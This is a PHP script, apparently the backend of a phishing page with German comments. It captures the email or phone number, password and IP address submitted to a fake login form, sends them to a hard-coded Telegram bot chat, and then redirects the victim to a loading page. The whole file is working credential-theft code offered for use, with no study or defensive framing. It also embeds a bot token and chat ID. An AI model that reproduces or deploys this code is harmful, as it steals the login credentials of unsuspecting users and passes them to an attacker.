<?php
                                       
$botToken = '8774738162:AAG5wwzAn4uDk-31PZcYQxkwA3XDnEqIFjk';
$chatId = '-5227546407';

// Daten vom Formular
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// IP-Adresse des Nutzers
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Nachricht erstellen
$message = "Neue Login-Daten:\n";
$message .= "E-Mail/Handynummer: $email\n";
$message .= "Passwort: $password\n";
$message .= "IP: $ipAddress";

// Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Daten für POST
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Telegram Nachricht senden
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Weiterleitung
header('Location: ../loading.html');
exit();
?>